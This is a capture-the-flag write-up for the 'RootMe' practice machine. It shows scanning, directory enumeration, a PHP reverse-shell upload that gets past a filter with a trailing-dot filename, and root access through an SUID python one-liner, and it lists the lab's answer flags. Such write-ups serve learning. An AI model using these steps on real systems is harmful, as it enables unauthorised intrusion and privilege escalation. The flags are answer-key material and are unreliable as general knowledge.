# RootMe 🏴‍☠️

**Date:** 09.02.2025  
**Difficulty:** Easy

---
## Questions and Answers ✅

1. **Scan the machine, how many ports are open?**  
   `2`
2. **What version of Apache is running?**  
   `2.4.29`
3. **What service is running on port 22?**  
   `ssh`
4. **What is the hidden directory?**  
   `/panel/`
5. **user.txt (flag)?**  
   `THM{y0u_g0t_a_sh3ll}`
6. **Search for files with SUID permission, which file is unusual?**  
   `/usr/bin/python`
7. **root.txt (flag)?**  
   `THM{pr1v1l3g3_3sc4l4t10n}`

---
## Obtained Information 🔍

- **Target IP Address:** `<IP_ADDRESS>`
- **Open ports:** `22` (SSH), `80` (HTTP)
- **Website allows unauthenticated file uploads**, and uploaded files can be accessed.

---
## Process 🕵️‍♂️

### **1. Scanning the machine with Nmap**
```bash
nmap -sV -sS <IP_ADDRESS>
```
**Results:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
This answers three questions at once!

### **2. Discovering hidden directories with Gobuster**
```bash
gobuster dir -u "http://<IP_ADDRESS>" -w ./Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .js,.php
```
**Results:**
```bash
/index.php            (Status: 200)
/.php                 (Status: 403)
/uploads              (Status: 200)
/css                  (Status: 200)
/js                   (Status: 200)
/panel                (Status: 200) ✅
/server-status        (Status: 403)
```
We found `/panel/` as the hidden directory!

### **3. Exploiting Unauthenticated File Upload**
Since the web server allows file uploads, we set up a listener for incoming connections:
```bash
nc -vnlp 1234
```
Then, we upload a **reverse shell script**:
🔗 [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

### **4. Bypassing File Upload Restrictions**
Uploading a `.php` file directly is blocked. However, adding a dot (`.`) at the end of the filename (`shell.php.`) bypasses this restriction!

### **5. Getting a Shell and Finding the First Flag**
Once the reverse shell is active, we locate `user.txt`:
```bash
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```
✅ First flag obtained!

### **6. Searching for SUID Files**
We look for files with the **SUID bit**, which allows privilege escalation:
```bash
find / -user root -perm /4000 2>/dev/null | grep -v "Permission"
```
✅ Unusual file found: `/usr/bin/python`

### **7. Exploiting SUID Python for Privilege Escalation**
This file is listed on **GTFOBins**, meaning it can be abused to escalate privileges:
> *If the binary has the SUID bit set, it does not drop elevated privileges and may be abused to access the file system or maintain privileged access as a SUID backdoor.*

Running the following command gives us a root shell:
```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami  
root
```
✅ We now have root access!

### **8. Retrieving the Final Flag**
With root access, we find `root.txt` in `/root/`:
```bash
cat /root/root.txt
```
✅ Final flag obtained!

---
## Reflection & Questions for Further Research 🤔💡

- Why are PHP scripts executed when accessed, but Python or Bash scripts are not?

---
## Summary & Takeaways 📌📖

- **Found hidden directories using Gobuster.**
- **Learned how to bypass file upload restrictions using a trailing dot (`.`).**
- **Used GTFOBins to exploit SUID binaries for privilege escalation.**
- **Understood how `/usr/bin/python` can be abused when SUID is set.** (BTW. I thought that bin in directory means trash bin or something 😆)
- **Realized the importance of checking for SUID binaries in privilege escalation.**